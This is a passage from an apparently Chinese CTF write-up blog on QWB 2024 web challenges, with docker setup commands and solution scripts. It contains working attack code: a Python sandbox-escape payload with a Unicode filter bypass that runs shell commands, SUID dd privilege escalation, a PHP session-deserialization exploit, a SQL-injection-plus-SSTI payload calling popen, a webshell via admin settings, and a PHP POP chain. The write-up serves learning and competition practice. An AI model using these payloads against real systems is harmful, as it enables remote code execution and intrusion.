class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unicode_bypass</span>(<span class="params">payload</span>):</span><br><span class="line">    waf = <span class="string">&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line">    length = <span class="number">10500</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> waf:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            <span class="keyword">if</span> unidecode.unidecode(<span class="built_in">chr</span>(i)) == c <span class="keyword">and</span> <span class="built_in">ord</span>(c) != i:</span><br><span class="line">                payload = payload.replace(c, <span class="built_in">chr</span>(i))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i == length-<span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(c + <span class="string">&quot; not found.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&#x27;);__builtins__.len = lambda x: 1;[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&#x27;_wrap_close&#x27;][0][&#x27;system&#x27;](&#x27;whoami&#x27;)#&#x27;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;);__builtins__.len = lambda x: 1;[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&#x27;_wrap_close&#x27;][0][&#x27;system&#x27;](&#x27;ls -la /&#x27;)#&#x27;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;);__builtins__.len = lambda x: 1;[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&#x27;_wrap_close&#x27;][0][&#x27;system&#x27;](&#x27;find / -user root -perm -4000 -print 2&gt;/dev/null&#x27;)#&#x27;&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;);__builtins__.len = lambda x: 1;[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&#x27;_wrap_close&#x27;][0][&#x27;system&#x27;](&#x27;LFILE=/flag &amp;&amp; dd if=$LFILE&#x27;)#&#x27;&quot;</span></span><br><span class="line">payload = unicode_bypass(payload)</span><br><span class="line"><span class="comment">## payload = &#x27;´)·print(123)۞´&#x27;</span></span><br><span class="line">post_data = <span class="string">&quot;&quot;&quot;&#123;&quot;blocks&quot;:&#123;&quot;languageVersion&quot;:0,&quot;blocks&quot;:[&#123;&quot;type&quot;:&quot;print&quot;,&quot;id&quot;:&quot;=,2Vdt^u?s)z/Q=Fb/[Y&quot;,&quot;x&quot;:33,&quot;y&quot;:162,&quot;inputs&quot;:&#123;&quot;TEXT&quot;:&#123;&quot;block&quot;:&#123;&quot;type&quot;:&quot;text&quot;,&quot;fields&quot;:&#123;&quot;TEXT&quot;:&quot;%s&quot;&#125;&#125;&#125;&#125;&#125;]&#125;&#125;&quot;&quot;&quot;</span> % (payload)</span><br><span class="line"><span class="built_in">print</span>(post_data)</span><br><span class="line"><span class="comment">## blockly_data = json.loads(post_data)</span></span><br><span class="line"><span class="comment">## try:</span></span><br><span class="line"><span class="comment">##     python_code = json_to_python(blockly_data)</span></span><br><span class="line"><span class="comment">##     print(do(python_code))</span></span><br><span class="line"><span class="comment">## except Exception as e:</span></span><br><span class="line"><span class="comment">##     jsonify(&#123;&quot;error&quot;: &quot;Error generating Python code&quot;, &quot;details&quot;: str(e)&#125;)</span></span><br></pre></td></tr></table></figure><p>rce之后发现权限是nobody，使用dd的suid提权，不再赘述<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/24746009105f54f65a54a48ae570d59e.png"></p><h2 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name platform -p 8080:80 sketchpl4ne/qwb2024:platform_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>思路：session反序列化+字符减少反序列化逃逸</p><p>坑点：win上使用phpstudy搭建的环境，存在字符不会替换的情况，最好起docker或者linux虚拟机</p><p>赛后又看了下，发现其实挺简单的，首先<code>class.php</code>存在字符减少逃逸<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2c9bbcb439ae0634ab1e85dabc7cf3f8.png"><br>然后开了session_start()，<code>dashboard.php</code>这里调用了session，是反序列化点<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/de76a4d0ada05d153851518a8754cb16.png"></p><p>PS：注意到<code>index.php</code>在序列化数据里插入随机长度session-key增加难度，采用爆破方式去赌概率即可，另外调试环境可知需要访问两次才可使恶意字符被置空，所以先访问两次<code>index.php</code>置空构造payload，再访问<code>dashboard.php</code>触发反序列化。</p><p>exp如下：</p><figure class="highlight python"><figcaption><span>title:exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## --coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;popen&#x27;</span>*<span class="number">10</span>,</span><br><span class="line">    <span class="comment">## &#x27;password&#x27;: &#x27;;a|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:10:&quot;phpinfo();&quot;;&#125;;&#x27;</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;&quot;&quot;;a|O:15:&quot;notouchitsclass&quot;:1:&#123;s:4:&quot;data&quot;;s:20:&quot;syssystemtem(&#x27;cat /flag&#x27;);&quot;;&#125;&quot;&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;dabe6d7479f521b93d2646924d8810b0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    requests.post(url, data=payload,cookies=cookie,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    requests.post(url, data=payload, cookies=cookie,verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">    res = requests.get(url + <span class="string">&quot;dashboard.php&quot;</span>,cookies=cookie)</span><br><span class="line">    <span class="comment">## if &quot;PHP Version 7.3.33&quot; in res.text:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] test <span class="subst">&#123;i+<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line">    i+=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3a1eea41f7961e715e783f93569fac24.png"></p><h2 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h2><h3 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name xiaohuanxiong -p 8080:80 -p 3306:3306 sketchpl4ne/qwb2024:xiaohuanxiong_img</span><br></pre></td></tr></table></figure><p>启动后进<code>/install</code>路由安装，数据库名称<code>hm</code>，密码<code>root/root</code>，测试数据库连接以后安装<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/fd444c9425bcbb5002234deb421a6825.png"></p><h3 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h3><p>代码审计直接有未授权后台登录：<code>/admin/admins/</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/a04dbb9d26d79e2e9deb5d4e854f272e.png"></p><p>然后就可以新建管理员账户<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/dceef1139b6bdce89d16ad0300efd9a8.png"></p><p>然后在支付设置那里，可以php代码执行，会写到配置文件里，哪都可以包含。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c23edf9e9f2a839e01185dbd05c016ed.png"><br>写shell，拿flag<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/0082293b4e457cd385a2e0a0297c6d71.png"></p><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><h3 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这题没出，网上也没找到环境，只能看看wp (不过也没啥新东西)</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>思路：GPT跑贪吃蛇+ 伪装成sql注入的ssti</p><figure class="highlight python"><figcaption><span>title:fuzz_snake.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> queue <span class="keyword">import</span> PriorityQueue</span><br><span class="line"><span class="keyword">from</span> copy <span class="keyword">import</span> deepcopy <span class="keyword">as</span> dcp</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze28vznmiok836ummk1.cloudeci1.ichunqiu.com:5000&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line">direc = (<span class="string">&quot;RIGHT&quot;</span>, <span class="string">&quot;DOWN&quot;</span>, <span class="string">&quot;LEFT&quot;</span>, <span class="string">&quot;UP&quot;</span>)</span><br><span class="line">size = <span class="number">20</span></span><br><span class="line">board = np.zeros((size, size), dtype=<span class="built_in">int</span>)</span><br><span class="line">QUE = PriorityQueue()</span><br><span class="line">FourDirec = <span class="keyword">lambda</span> x, y: [</span><br><span class="line">    (x + <span class="number">1</span>, y, <span class="number">1</span>),</span><br><span class="line">    (x - <span class="number">1</span>, y, <span class="number">3</span>),</span><br><span class="line">    (x, y + <span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">    (x, y - <span class="number">1</span>, <span class="number">2</span>),</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login_Start</span>(<span class="params">name</span>):</span><br><span class="line">    req.post(url + <span class="string">&quot;/set_username&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: name&#125;)</span><br><span class="line">    req.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendmove</span>(<span class="params">direction</span>):</span><br><span class="line">    res = req.post(url + <span class="string">&quot;/move&quot;</span>, json=&#123;<span class="string">&quot;direction&quot;</span>: direction&#125;)</span><br><span class="line">    <span class="comment">## print(res.text)</span></span><br><span class="line">    data = json.loads(res.text)</span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&quot;status&quot;</span>] == <span class="string">&quot;ok&quot;</span>:</span><br><span class="line">        food = data[<span class="string">&quot;food&quot;</span>][::-<span class="number">1</span>]</span><br><span class="line">        snake = [i[::-<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> data[<span class="string">&quot;snake&quot;</span>]]</span><br><span class="line">        score = data[<span class="string">&quot;score&quot;</span>]</span><br><span class="line">        <span class="comment">## print(food, snake)</span></span><br><span class="line">        <span class="keyword">return</span> food, snake, score</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_path</span>(<span class="params">food, snake</span>):</span><br><span class="line">    head = snake[<span class="number">0</span>]</span><br><span class="line">    dist = <span class="built_in">abs</span>(food[<span class="number">0</span>] - head[<span class="number">0</span>]) + <span class="built_in">abs</span>(food[<span class="number">1</span>] - head[<span class="number">1</span>])</span><br><span class="line">    path = [(-<span class="number">1</span>, -<span class="number">1</span>, dist)]</span><br><span class="line">    heads = [head]</span><br><span class="line">    QUE.queue.clear()</span><br><span class="line"></span><br><span class="line">    QUE.put((dist, dcp(snake), <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> QUE.empty():</span><br><span class="line">        temp = QUE.get()</span><br><span class="line">        <span class="comment">## print(temp)</span></span><br><span class="line">        dist, snake, pth = temp</span><br><span class="line">        head = snake[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> head[<span class="number">0</span>] == food[<span class="number">0</span>] <span class="keyword">and</span> head[<span class="number">1</span>] == food[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">while</span> pth != <span class="number">0</span>:</span><br><span class="line">                pth, p, dist = path[pth]</span><br><span class="line">                <span class="comment">## print(heads[pth], direc[p])</span></span><br><span class="line">            <span class="keyword">return</span> direc[p]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x, y, p <span class="keyword">in</span> FourDirec(head[<span class="number">0</span>], head[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= x &lt; size <span class="keyword">and</span> <span class="number">0</span> &lt;= y &lt; size <span class="keyword">and</span> [x, y] <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">                newsnake = [[x, y]] + dcp(snake)[:-<span class="number">1</span>]</span><br><span class="line">                dist = <span class="built_in">abs</span>(x - food[<span class="number">0</span>]) + <span class="built_in">abs</span>(y - food[<span class="number">1</span>])</span><br><span class="line">                path.append((pth, p, dist))</span><br><span class="line">                heads.append([x, y])</span><br><span class="line">                QUE.put((dist, dcp(newsnake), <span class="built_in">len</span>(path) - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">snake, food</span>):</span><br><span class="line">    board = np.zeros((size, size), dtype=<span class="built_in">int</span>)</span><br><span class="line">    board[food[<span class="number">0</span>], food[<span class="number">1</span>]] = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> snake:</span><br><span class="line">        board[i[<span class="number">0</span>], i[<span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(board)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Login_Start(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    food, snake, sc = sendmove(<span class="string">&quot;RIGHT&quot;</span>)</span><br><span class="line">    <span class="comment">## print(food, snake)</span></span><br><span class="line">    <span class="comment">## draw(snake, food)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        dire = find_path(food, snake)</span><br><span class="line">        <span class="built_in">print</span>(sc, dire, food, snake)</span><br><span class="line">        food, snake, sc = sendmove(dire)</span><br><span class="line">        draw(snake, food)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>长度到50给路由，然后是sqli+ssti。</p><figure class="highlight python"><figcaption><span>title:payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/snake_win?username=<span class="number">1</span><span class="string">&#x27; union select 1,2,&quot;&#123;&#123;[].__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;</span>popen<span class="string">&#x27;](&#x27;</span>cat /f*<span class="string">&#x27;).read()&#125;&#125;&quot; --+</span></span><br></pre></td></tr></table></figure><h2 id="password-game"><a href="#password-game" class="headerlink" title="password_game"></a>password_game</h2><p>前面的计算脚本编写很简单，但构造链子卡了我很久，果然是用的引用&#x3D; &#x3D;。</p><h3 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name password_game -p 8080:80 sketchpl4ne/qwb2024:password_game_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p><strong>思路</strong>：首先是下面的逻辑，经过测试可以发现是永真的，<code>$this-&gt;username</code>可以任意传递并输出，<code>filter()</code>是失效的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">// this code have bugs that expression always be true even string does not match.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来问题是如何输出flag，下面的代码中flag被赋值到<code>$this-&gt;value</code>，将<code>this-&gt;username</code>设置为value的引用即可，<code>$this-&gt;value == &quot;2024qwb&quot;</code>可以轻松绕过使用字符串弱类型比较。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;in&quot;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__destruct()</code>会自动触发，<code>__get()</code>通过<code>... &amp;&amp; $user-&gt;password == &quot;2024qwb&quot;)</code>将password设置成root触发。</p><p>最终exp如下：</p><figure class="highlight php"><figcaption><span>title:exp.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>] = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">guest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="string">&quot;guest&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$value</span>();  <span class="comment">// 这里不是$this-&gt;value，傻鸟出题人故意的</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;in&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// this code have bugs that if expression always be true even string does not match.</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> user;</span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> root;</span><br><span class="line"><span class="variable">$r</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable">$r</span>-&gt;value = <span class="number">2024</span>;</span><br><span class="line"><span class="variable">$u</span>-&gt;username = &amp;<span class="variable">$r</span>-&gt;value;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="comment">// print_r(filter($s).&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">// $user=unserialize(filter($s));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if(strpos($user-&gt;username, &quot;admin&quot;) == 0 &amp;&amp; $user-&gt;password == &quot;2024qwb&quot;)&#123;</span></span><br><span class="line"><span class="comment">//     echo &quot;hello!&quot;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="proxy"><a href="#proxy" 